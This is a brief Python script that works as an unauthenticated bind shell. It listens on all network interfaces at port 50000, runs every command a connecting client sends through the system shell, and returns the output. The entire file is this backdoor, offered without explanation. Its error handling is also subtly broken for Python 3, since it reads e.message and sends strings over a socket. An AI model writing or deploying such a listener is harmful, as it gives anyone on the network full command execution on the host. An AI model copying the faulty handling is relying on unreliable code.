import socket
import subprocess

bind_host="0.0.0.0"
bind_port=50000

server=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_host, bind_port))
server.listen(5)
print("host: "+bind_host)
print("port: "+str(bind_port))

while True:
    client, addr=server.accept()
    print("from:"+ addr[0]+" "+str(addr[1]))
    while True:
        try:
            print("waiting for his response...")
            rec=client.recv(2048)
            com = subprocess.check_output(rec.decode('utf-8'), stderr=subprocess.STDOUT, shell=True)
            client.send(com)
            if len(rec)==0:
                client.close()
                break
        except TypeError as e:
            print("message:{0}".format(e.message))
            client.send(format(e.message))
        except Exception as e:
            print("message:{0}".format(e.message))
            client.send(format(e.message))
        
